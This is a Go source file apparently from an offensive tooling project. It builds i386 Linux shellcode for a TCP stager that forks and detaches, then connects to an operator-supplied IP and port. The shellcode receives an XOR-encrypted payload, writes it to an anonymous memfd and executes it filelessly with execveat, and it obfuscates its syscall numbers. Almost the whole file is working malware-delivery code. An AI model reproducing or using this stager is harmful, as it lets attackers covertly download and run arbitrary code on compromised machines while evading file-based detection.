package stager

import "net"

func init() {
	builders["linux/386"] = archBuilder{asmLinuxX86, makeELF32Wrapper(3)}
}

// asmLinuxX86 generates i386 Linux shellcode for a TCP stager.
//
// Flow: fork -> setsid -> socket(socketcall) -> connect(socketcall) ->
// read(size) -> mmap2 -> recv loop -> close(sock) ->
// memfd_create -> write loop -> execveat(AT_EMPTY_PATH)
//
// Register allocation:
//   edi = sockfd (until close), esi = mmap buf, ebp = size
func asmLinuxX86(ip net.IP, port uint16, xorKey [4]byte) []byte {
	portBE := uint16BE(port)
	sockDword1 := uint32(0x0002) | uint32(portBE)<<16
	sockDword2 := uint32(ip[0]) | uint32(ip[1])<<8 | uint32(ip[2])<<16 | uint32(ip[3])<<24
	xorKeyU32 := uint32(xorKey[0]) | uint32(xorKey[1])<<8 | uint32(xorKey[2])<<16 | uint32(xorKey[3])<<24

	var s []byte

	// fork()
	s = append(s, 0xb8, 0x02, 0x00, 0x00, 0x00) // mov eax, 2
	s = append(s, 0xcd, 0x80)                     // int 0x80
	s = append(s, 0x85, 0xc0)                     // test eax, eax
	s = append(s, 0x0f, 0x85)                     // jnz -> exit
	forkJmpOff := len(s)
	s = append(s, 0, 0, 0, 0)

	// setsid()
	s = append(s, 0xb8, 0x42, 0x00, 0x00, 0x00) // mov eax, 66
	s = append(s, 0xcd, 0x80)                     // int 0x80

	// socketcall(SYS_SOCKET=1, [2, 1, 0])
	s = append(s, 0x31, 0xdb)     // xor ebx, ebx
	s = append(s, 0xf7, 0xe3)     // mul ebx
	s = append(s, 0x53)           // push 0
	s = append(s, 0x43)           // inc ebx
	s = append(s, 0x53)           // push 1
	s = append(s, 0x6a, 0x02)     // push 2
	s = append(s, 0xb0, 0x66)     // mov al, 0x66
	s = append(s, 0x89, 0xe1)     // mov ecx, esp
	s = append(s, 0xcd, 0x80)     // int 0x80
	s = append(s, 0x89, 0xc7)     // mov edi, eax

	// socketcall(SYS_CONNECT=3, [sockfd, &addr, 16])
	s = append(s, 0x68)           // push IP
	s = appendU32(s, sockDword2)
	s = append(s, 0x68)           // push AF_INET|port
	s = appendU32(s, sockDword1)
	s = append(s, 0x89, 0xe1)     // mov ecx, esp
	s = append(s, 0x6a, 0x10)     // push 16
	s = append(s, 0x51)           // push ecx
	s = append(s, 0x57)           // push edi
	s = append(s, 0xb0, 0x66)     // mov al, 0x66
	s = append(s, 0xb3, 0x03)     // mov bl, 3
	s = append(s, 0x89, 0xe1)     // mov ecx, esp
	s = append(s, 0xcd, 0x80)     // int 0x80
	s = append(s, 0x85, 0xc0)     // test eax, eax
	s = append(s, 0x0f, 0x88)     // js -> exit
	connectFailOff := len(s)
	s = append(s, 0, 0, 0, 0)

	// read(sockfd, &size, 4)
	s = append(s, 0x83, 0xec, 0x04)              // sub esp, 4
	s = append(s, 0xb8, 0x03, 0x00, 0x00, 0x00) // mov eax, 3
	s = append(s, 0x89, 0xfb)                     // mov ebx, edi
	s = append(s, 0x89, 0xe1)                     // mov ecx, esp
	s = append(s, 0xba, 0x04, 0x00, 0x00, 0x00) // mov edx, 4
	s = append(s, 0xcd, 0x80)                     // int 0x80
	s = append(s, 0x83, 0xf8, 0x04)              // cmp eax, 4
	s = append(s, 0x0f, 0x85)                     // jne -> exit
	readFailOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x8b, 0x2c, 0x24)              // mov ebp, [esp]
	s = append(s, 0x83, 0xc4, 0x04)              // add esp, 4
	// XOR-decrypt size
	s = append(s, 0x81, 0xf5)                    // xor ebp, imm32
	s = appendU32(s, xorKeyU32)

	// Save sockfd, mmap2(0, size, RW=3, PRIVATE|ANON=0x22, -1, 0)
	s = append(s, 0x57)                            // push edi
	s = append(s, 0x55)                            // push ebp
	s = append(s, 0x31, 0xdb)                     // xor ebx, ebx
	s = append(s, 0x89, 0xe9)                     // mov ecx, ebp
	s = append(s, 0xba, 0x03, 0x00, 0x00, 0x00) // mov edx, 3
	s = append(s, 0xbe, 0x22, 0x00, 0x00, 0x00) // mov esi, 0x22
	s = append(s, 0xbf, 0xff, 0xff, 0xff, 0xff) // mov edi, -1
	s = append(s, 0x31, 0xed)                     // xor ebp, ebp
	s = append(s, 0xb8, 0xc0, 0x00, 0x00, 0x00) // mov eax, 192
	s = append(s, 0xcd, 0x80)                     // int 0x80
	s = append(s, 0x85, 0xc0)                     // test eax, eax
	s = append(s, 0x0f, 0x88)                     // js -> exit
	mmapFailOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x89, 0xc6)                     // mov esi, eax
	s = append(s, 0x5d)                            // pop ebp
	s = append(s, 0x5f)                            // pop edi

	// recv loop
	s = append(s, 0x6a, 0x00) // push 0
	recvLoopStart := len(s)
	s = append(s, 0x8b, 0x1c, 0x24)              // mov ebx, [esp]
	s = append(s, 0x39, 0xeb)                     // cmp ebx, ebp
	s = append(s, 0x0f, 0x8d)                     // jge -> recv_done
	recvDoneOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x89, 0xea)                     // mov edx, ebp
	s = append(s, 0x29, 0xda)                     // sub edx, ebx
	s = append(s, 0x8d, 0x0c, 0x1e)              // lea ecx, [esi+ebx]
	s = append(s, 0x89, 0xfb)                     // mov ebx, edi
	s = append(s, 0xb8, 0x03, 0x00, 0x00, 0x00) // mov eax, 3
	s = append(s, 0xcd, 0x80)                     // int 0x80
	s = append(s, 0x85, 0xc0)                     // test eax, eax
	s = append(s, 0x0f, 0x8e)                     // jle -> exit
	recvFailOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x01, 0x04, 0x24)              // add [esp], eax
	s = append(s, 0xe9)                            // jmp recv_loop
	recvBackOff := len(s)
	s = append(s, 0, 0, 0, 0)
	patchRel32(s, recvDoneOff, len(s))
	patchRel32(s, recvBackOff, recvLoopStart)
	s = append(s, 0x83, 0xc4, 0x04) // add esp, 4

	// XOR decrypt: esi=buf, ebp=size
	// Use jmp/call/pop to get key address, then loop
	s = append(s, 0xeb) // jmp -> fwd_key
	jmpKeyOff := len(s)
	s = append(s, 0x00)
	keyPopAddr := len(s)
	s = append(s, 0x5a) // pop edx (key addr)
	s = append(s, 0x31, 0xdb) // xor ebx, ebx (i=0)
	xorLoopStart := len(s)
	s = append(s, 0x39, 0xeb)                     // cmp ebx, ebp
	s = append(s, 0x0f, 0x8d)                     // jge -> xor_done
	xorDoneOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x89, 0xd9)                     // mov ecx, ebx
	s = append(s, 0x83, 0xe1, 0x03)              // and ecx, 3
	s = append(s, 0x0f, 0xb6, 0x0c, 0x0a)       // movzx ecx, byte [edx+ecx]
	s = append(s, 0x30, 0x0c, 0x1e)              // xor byte [esi+ebx], cl
	s = append(s, 0x43)                            // inc ebx
	s = append(s, 0xe9)                            // jmp xor_loop
	xorBackOff := len(s)
	s = append(s, 0, 0, 0, 0)
	patchRel32(s, xorDoneOff, len(s))
	patchRel32(s, xorBackOff, xorLoopStart)
	// Continue to close(sock) - jump over the key data + call
	s = append(s, 0xeb) // jmp -> after_key
	jmpAfterKeyOff := len(s)
	s = append(s, 0x00)
	// fwd_key: call keyPopAddr; key data
	fwdKeyAddr := len(s)
	s[jmpKeyOff] = byte(fwdKeyAddr - (jmpKeyOff + 1))
	s = append(s, 0xe8)
	callKeyOff := len(s)
	s = append(s, 0, 0, 0, 0)
	patchRel32(s, callKeyOff, keyPopAddr)
	s = append(s, xorKey[:]...)
	// after_key:
	s[jmpAfterKeyOff] = byte(len(s) - (jmpAfterKeyOff + 1))

	// close(sockfd)
	s = append(s, 0xb8, 0x06, 0x00, 0x00, 0x00) // mov eax, 6
	s = append(s, 0x89, 0xfb)                     // mov ebx, edi
	s = append(s, 0xcd, 0x80)                     // int 0x80

	// memfd_create("", MFD_CLOEXEC=1) - syscall 356
	// Push null byte on stack for empty string
	s = append(s, 0x31, 0xdb)                     // xor ebx, ebx
	s = append(s, 0x53)                            // push ebx
	s = append(s, 0x89, 0xe3)                     // mov ebx, esp (points to "")
	s = append(s, 0xb9, 0x01, 0x00, 0x00, 0x00) // mov ecx, 1 (MFD_CLOEXEC)
	s = x86EmitSyscall(s, 356)                   // obfuscated mov eax, 356
	s = append(s, 0xcd, 0x80)                     // int 0x80
	s = append(s, 0x83, 0xc4, 0x04)              // add esp, 4
	s = append(s, 0x85, 0xc0)                     // test eax, eax
	s = append(s, 0x0f, 0x88)                     // js -> exit
	memfdFailOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x89, 0xc7) // mov edi, eax (memfd)

	// write loop: write(memfd, buf+off, remaining)
	s = append(s, 0x6a, 0x00) // push 0
	writeLoopStart := len(s)
	s = append(s, 0x8b, 0x0c, 0x24)              // mov ecx, [esp]
	s = append(s, 0x39, 0xe9)                     // cmp ecx, ebp
	s = append(s, 0x0f, 0x8d)                     // jge -> write_done
	writeDoneOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x89, 0xea)                     // mov edx, ebp
	s = append(s, 0x29, 0xca)                     // sub edx, ecx
	s = append(s, 0x8d, 0x0c, 0x0e)              // lea ecx, [esi+ecx]
	s = append(s, 0x89, 0xfb)                     // mov ebx, edi
	s = append(s, 0xb8, 0x04, 0x00, 0x00, 0x00) // mov eax, 4
	s = append(s, 0xcd, 0x80)                     // int 0x80
	s = append(s, 0x85, 0xc0)                     // test eax, eax
	s = append(s, 0x0f, 0x8e)                     // jle -> exit
	writeFailOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x01, 0x04, 0x24)              // add [esp], eax
	s = append(s, 0xe9)                            // jmp write_loop
	writeBackOff := len(s)
	s = append(s, 0, 0, 0, 0)
	patchRel32(s, writeDoneOff, len(s))
	patchRel32(s, writeBackOff, writeLoopStart)
	s = append(s, 0x83, 0xc4, 0x04) // add esp, 4

	// execveat(memfd, "", NULL, NULL, AT_EMPTY_PATH=0x1000) - syscall 358
	// i386 6-arg syscall: ebx=fd, ecx=path, edx=argv, esi=envp, edi=flags, ebp=unused
	// But wait: 6-arg syscalls on i386 use struct pointer. Actually no:
	// execveat uses 5 args: ebx=dirfd, ecx=pathname, edx=argv, esi=envp, edi=flags
	s = append(s, 0x89, 0xfb)                     // mov ebx, edi (memfd fd)
	s = append(s, 0x31, 0xc9)                     // xor ecx, ecx
	s = append(s, 0x51)                            // push ecx
	s = append(s, 0x89, 0xe1)                     // mov ecx, esp (points to "")
	s = append(s, 0x31, 0xd2)                     // xor edx, edx (argv=NULL)
	s = append(s, 0x31, 0xf6)                     // xor esi, esi (envp=NULL)
	s = append(s, 0xbf, 0x00, 0x10, 0x00, 0x00) // mov edi, 0x1000 (AT_EMPTY_PATH)
	s = x86EmitSyscall(s, 358)                   // obfuscated mov eax, 358
	s = append(s, 0xcd, 0x80)                     // int 0x80

	// exit(1)
	exitAddr := len(s)
	s = append(s, 0xb8, 0x01, 0x00, 0x00, 0x00) // mov eax, 1
	s = append(s, 0xbb, 0x01, 0x00, 0x00, 0x00) // mov ebx, 1
	s = append(s, 0xcd, 0x80)                     // int 0x80

	for _, off := range []int{forkJmpOff, connectFailOff, readFailOff, mmapFailOff, recvFailOff, memfdFailOff, writeFailOff} {
		patchRel32(s, off, exitAddr)
	}

	return s
}
